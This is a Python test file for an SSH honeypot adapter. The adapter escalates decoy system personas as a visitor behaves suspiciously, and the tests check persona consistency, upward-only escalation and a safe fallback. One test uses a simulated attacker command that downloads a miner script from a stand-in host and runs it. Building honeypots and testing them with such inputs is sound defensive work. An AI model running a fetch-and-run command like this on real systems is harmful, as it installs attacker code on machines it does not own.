"""
Tests for Sensor Production Adaptive Adapter (sensor/adaptive_server.py).
Pre-registered in SPEC.md Section 5.1, Section 5.3 and Spike S1.
"""

from __future__ import annotations

import os
import tempfile
import pytest
from gatekeeper.decision_api import DecisionEngine
from gatekeeper.visitor_memory import VisitorMemory
from sensor.adaptive_server import PersonaManager, AdaptiveSessionAdapter


def test_persona_manager_identity_coherence():
    """Verify that all personas share the unified system identity (SPEC Risk R8)."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        pm = PersonaManager(base_dir=tmp_dir)
        p1 = pm.get_persona("T1")
        p2 = pm.get_persona("T2")

        # Distro and kernel must be strictly identical across tiers
        assert p1.distro == p2.distro == "Ubuntu"
        assert p1.hostname == p2.hostname
        assert p1.kernel_release == p2.kernel_release

        # Filesystem overlay differences: T2 has richer decoy files
        assert os.path.exists(os.path.join(p2.fs_dir, "etc", "motd"))
        assert os.path.exists(os.path.join(p2.fs_dir, "var", "www"))
        assert not os.path.exists(os.path.join(p1.fs_dir, "var", "www"))


def test_adaptive_session_escalation_flow():
    """Test full session lifecycle with upward-only tier escalation."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = os.path.join(tmp_dir, "test_decisions.db")
        memory = VisitorMemory(db_path=db_path)
        engine = DecisionEngine(memory=memory, salt="test_salt")
        pm = PersonaManager(base_dir=tmp_dir)

        adapter = AdaptiveSessionAdapter(
            visitor_ip="198.51.100.22",
            session_id="sess_001",
            decision_engine=engine,
            persona_manager=pm,
        )

        # Starts at T1
        assert adapter.current_tier == "T1"
        assert adapter.get_active_persona().tier == "T1"

        # Connection stage (S1)
        adapter.on_kex_completed(client_version="SSH-2.0-paramiko_2.8.0", hassh="abcdef123456")
        assert adapter.current_tier == "T1"

        # Auth stage (S2) with high failed attempts -> triggers escalation
        adapter.on_auth_completed(success=True, failed_count=10, username="root")
        
        # After command invocation with high value signal
        adapter.on_command_received("wget http://evil.com/miner.sh; sh miner.sh")
        # System escalated to T2 or T3
        assert adapter.current_tier in ("T2", "T3")
        # Persona reflects escalated tier
        assert adapter.get_active_persona().tier == adapter.current_tier


def test_adaptive_session_monotone_upward_invariant():
    """Verify that once escalated to T2, the session never downgrades to T1."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        memory = VisitorMemory(db_path=os.path.join(tmp_dir, "mem.db"))
        engine = DecisionEngine(memory=memory)
        pm = PersonaManager(base_dir=tmp_dir)

        adapter = AdaptiveSessionAdapter(
            visitor_ip="198.51.100.33",
            session_id="sess_002",
            decision_engine=engine,
            persona_manager=pm,
        )

        # Manually force escalation to T2
        adapter.escalate_to("T2")
        assert adapter.current_tier == "T2"

        # Attempt to escalate to T1 (downgrade)
        adapter.escalate_to("T1")
        # Invariant preserved: remains T2
        assert adapter.current_tier == "T2"


def test_adaptive_session_fail_cheap_guarantee():
    """Verify fail-cheap: if decision engine errors, session continues safely in T1."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        pm = PersonaManager(base_dir=tmp_dir)

        class BrokenEngine:
            def decide(self, *args, **kwargs):
                raise RuntimeError("Database connection crashed")

        adapter = AdaptiveSessionAdapter(
            visitor_ip="198.51.100.44",
            session_id="sess_003",
            decision_engine=BrokenEngine(),
            persona_manager=pm,
        )

        # Triggers decision with broken engine
        adapter.on_command_received("ls -la")
        # Remains in safe default tier T1 without raising exception
        assert adapter.current_tier == "T1"
